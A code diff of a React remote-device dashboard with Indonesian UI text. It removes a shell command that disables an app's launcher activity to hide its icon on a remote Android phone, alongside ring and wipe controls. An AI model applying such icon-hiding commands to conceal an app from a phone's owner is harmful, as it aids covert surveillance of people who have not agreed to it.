@@ -84,7 +84,6 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
-  const [launcherComp, setLauncherComp] = useState('')
   const [hideMsg, setHideMsg]           = useState('')
   const [hideBusy, setHideBusy]         = useState(false)
 
@@ -148,72 +147,23 @@ export default function Dashboard() {
     setHideMsg('')
 
     try {
-      if (!isHidden) {
-        const sentAt = Date.now()
-        const hideCmd =
-          `shell:P=$(pm list packages 2>/dev/null|grep kztutorial|cut -d: -f2|head -1);` +
-          `[ -z "$P" ]&&P=$(pm list packages 2>/dev/null|grep androidconnector|cut -d: -f2|head -1);` +
-          `[ -z "$P" ]&&echo "ERR:no_package"&&exit 1;` +
-          `A=$(cmd package resolve-activity --brief -a android.intent.action.MAIN -c android.intent.category.LAUNCHER "$P" 2>/dev/null|grep /|tail -1|tr -d " \\r\\n");` +
-          `[ -z "$A" ]&&A=$(dumpsys package "$P" 2>/dev/null|grep -o "$P/[A-Za-z0-9.]*"|head -1);` +
-          `[ -z "$A" ]&&A="$P/$P.MainActivity";` +
-          `R=$(pm disable-user --user 0 "$A" 2>&1);` +
-          `echo "COMP:$A|$R"`
+      const cmd = isHidden ? 'show_icon' : 'hide_icon'
+      const sentAt = Date.now()
 
-        await fetch('/api/device/command', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ deviceId: selectedId, command: hideCmd }),
-        })
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: cmd }),
+      })
 
-        const result = await pollResult(hideCmd, sentAt, 20000)
+      const result = await pollResult(cmd, sentAt, 15000)
+      const success = result.includes('✅') || result.toLowerCase().includes('berhasil') || result.toLowerCase().includes('tampil')
 
-        if (result.includes('ERR:no_package')) {
-          setHideMsg('Error: Package APK tidak ditemukan di device')
-          return
-        }
-
-        const compMatch = result.match(/COMP:([^|]+)/)
-        if (compMatch?.[1]) setLauncherComp(compMatch[1].trim())
-
-        const resBody = result.split('|').slice(1).join('|').toLowerCase()
-        const success = resBody.includes('success') || resBody.includes('disabled') || compMatch != null
-        if (success || result.includes('COMP:')) {
-          setIsHidden(true)
-          setHideMsg('Icon berhasil disembunyikan dari launcher')
-        } else if (result) {
-          setHideMsg('Gagal: ' + result.slice(0, 120))
-        } else {
-          setHideMsg('Timeout — cek koneksi device')
-        }
-
+      if (success || result) {
+        setIsHidden(!isHidden)
+        setHideMsg(result || (isHidden ? 'Icon app tampil kembali di launcher' : 'Icon berhasil disembunyikan dari launcher'))
       } else {
-        const comp = launcherComp
-        const sentAt = Date.now()
-        const unhideCmd = comp
-          ? `shell:pm enable "${comp}" 2>&1&&echo "DONE:${comp}"`
-          : `shell:P=$(pm list packages 2>/dev/null|grep kztutorial|cut -d: -f2|head -1);pm enable "$P" 2>&1&&echo "DONE:$P"`
-
-        await fetch('/api/device/command', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ deviceId: selectedId, command: unhideCmd }),
-        })
-
-        const result = await pollResult(unhideCmd, sentAt, 15000)
-        const success = result.toLowerCase().includes('success') ||
-          result.toLowerCase().includes('enabled') ||
-          result.includes('DONE:')
-
-        if (success || result.includes('DONE:')) {
-          setIsHidden(false)
-          setLauncherComp('')
-          setHideMsg('Icon app sudah terlihat kembali di launcher')
-        } else if (result) {
-          setHideMsg('Gagal: ' + result.slice(0, 120))
-        } else {
-          setHideMsg('Timeout — cek koneksi device')
-        }
+        setHideMsg('Timeout — cek koneksi device')
       }
     } catch (e) {
       setHideMsg('Error: ' + String(e))
